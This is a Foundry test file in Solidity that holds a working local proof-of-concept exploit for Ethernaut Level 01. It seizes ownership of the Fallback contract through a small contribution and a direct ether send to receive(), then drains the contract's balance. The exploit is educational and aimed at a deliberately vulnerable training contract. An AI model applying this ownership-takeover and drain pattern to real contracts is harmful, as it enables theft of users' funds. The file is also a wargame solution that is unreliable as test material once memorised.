// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Fallback} from "../src/01-Fallback.sol";

/**
 * @title FallbackTest
 * @notice Demonstrates a local Proof-of-Concept (PoC) exploit for Ethernaut Level 01.
 * @dev Explains how Foundry tests let us test exploit mechanics locally with cheatcodes
 *      before broadcasting transactions on-chain.
 */
contract FallbackTest is Test {
    Fallback public fallbackContract;

    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        // Deploy the contract as the deployer
        vm.prank(deployer);
        fallbackContract = new Fallback();

        // Simulate existing funds sent to the contract (e.g. from previous contributors)
        vm.deal(address(fallbackContract), 1 ether);

        // Fund our attacker with a small amount of test ether
        vm.deal(attacker, 0.1 ether);
    }

    function test_InitialState() public view {
        // Contract owner is the deployer, not attacker
        assertEq(fallbackContract.owner(), deployer);
        assertNotEq(fallbackContract.owner(), attacker);
        assertEq(address(fallbackContract).balance, 1 ether);
    }

    function test_CannotWithdrawWithoutOwnership() public {
        // Attempting to withdraw as attacker fails with modifier revert
        vm.prank(attacker);
        vm.expectRevert("caller is not the owner");
        fallbackContract.withdraw();
    }

    function test_ExploitFallback() public {
        vm.startPrank(attacker);

        // -------------------------------------------------------------
        // STEP 1: Satisfy the contribution prerequisite:
        // contribute() requires msg.value < 0.001 ether
        // -------------------------------------------------------------
        fallbackContract.contribute{value: 0.0001 ether}();
        assertEq(fallbackContract.getContribution(), 0.0001 ether);

        // -------------------------------------------------------------
        // STEP 2: Trigger receive() by sending ether directly to the contract.
        // Condition in receive(): msg.value > 0 && contributions[msg.sender] > 0
        // Outcome: owner = msg.sender
        // -------------------------------------------------------------
        (bool success,) = address(fallbackContract).call{value: 1 wei}("");
        assertTrue(success, "Low-level call to trigger receive() failed");

        // Verify that ownership was transferred to attacker
        assertEq(fallbackContract.owner(), attacker, "Exploit failed: attacker is not owner");

        // -------------------------------------------------------------
        // STEP 3: Drain the contract balance using withdraw()
        // -------------------------------------------------------------
        uint256 contractBalanceBefore = address(fallbackContract).balance;
        assertTrue(contractBalanceBefore > 0, "Target contract has no balance to drain");

        uint256 attackerBalanceBefore = attacker.balance;
        fallbackContract.withdraw();

        // -------------------------------------------------------------
        // VERIFY VICTORY CONDITIONS:
        // 1. Attacker is owner
        // 2. Contract balance is drained to 0
        // -------------------------------------------------------------
        assertEq(fallbackContract.owner(), attacker);
        assertEq(address(fallbackContract).balance, 0, "Contract balance was not drained");
        assertEq(attacker.balance, attackerBalanceBefore + contractBalanceBefore);

        vm.stopPrank();

        console2.log("Successfully exploited Fallback!");
        console2.log("Final Contract Balance:", address(fallbackContract).balance);
        console2.log("Final Owner:", fallbackContract.owner());
    }
}
